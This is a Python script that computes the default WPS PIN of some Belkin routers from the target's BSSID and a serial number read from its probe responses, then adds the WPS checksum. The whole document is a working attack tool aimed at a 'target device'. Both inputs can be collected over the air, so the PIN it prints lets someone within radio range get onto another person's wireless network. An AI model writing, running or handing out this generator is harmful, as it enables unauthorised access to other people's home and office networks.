import argparse
import re

def char2int(char):
    return int(char,16)


def wps_checksum(pin):
    div = 0

    while pin:
        div += (3 * (pin % 10))
        pin = int(pin / 10)
        div += (pin % 10)
        pin = int(pin / 10)

    return (10 - div % 10) % 10


def main(mac, serial):
    mac_len = len(mac)
    serial_len = len(serial)

    # Get the four least significant digits of the serial number
    sn = dict()
    sn[0] = char2int(serial[serial_len-1])
    sn[1] = char2int(serial[serial_len-2])
    sn[2] = char2int(serial[serial_len-3])
    sn[3] = char2int(serial[serial_len-4])

    # Get the four least significant nibbles of the MAC address
    nic = dict()
    nic[0] = char2int(mac[mac_len-1])
    nic[1] = char2int(mac[mac_len-2])
    nic[2] = char2int(mac[mac_len-3])
    nic[3] = char2int(mac[mac_len-4])

    k1 = (sn[2] +
          sn[3] +
          nic[0] +
          nic[1]) % 16

    k2 = (sn[0] +
          sn[1] +
          nic[3] +
          nic[2]) % 16

    pin = k1 ^ sn[1]

    t1 = k1 ^ sn[0]
    t2 = k2 ^ nic[1]

    p1 = nic[0] ^ sn[1] ^ t1
    p2 = k2 ^ nic[0] ^ t2
    p3 = k1 ^ sn[2] ^ k2 ^ nic[2]

    k1 = k1 ^ k2

    pin = (pin ^ k1) * 16
    pin = (pin + t1) * 16
    pin = (pin + p1) * 16
    pin = (pin + t2) * 16
    pin = (pin + p2) * 16
    pin = (pin + k1) * 16
    pin += p3
    pin = (pin % 10000000) - (int((pin % 10000000) / 10000000) * k1)

    return (pin * 10) + wps_checksum(pin)


if __name__ == '__main__':
    def bssid_arg(value):
        # Remove non-alphanum characters (e.g., colon or dashes)
        value = re.sub('[^a-zA-Z0-9]', '', value)

        if len(value) < 4:
            raise argparse.ArgumentTypeError('BSSID of the target device is too short; last 2 octects (4 characters) are required.')
        else:
            return value

    def serial_arg(value):
        if len(value) < 4:
            raise argparse.ArgumentTypeError('Serial number of the target device is too short; last 4 characters are required.')
        elif re.search('[^a-zA-Z0-9]', value) is not None:
            raise argparse.ArgumentTypeError('Found non-alphanumerical character in serial number, please make sure to use a valid serial number.')
        else:
            return value

    parser = argparse.ArgumentParser(description='WPS pin generator for some Belkin routers.')
    parser.add_argument('bssid', help='BSSID of the target device (last 2 octets required)', type=bssid_arg)
    parser.add_argument('serial', help='Serial number of the target device, usually found in a probe response (last 4 chars required)', type=serial_arg)

    args = parser.parse_args()
    
    print('Default WPS PIN:', main(args.bssid, args.serial))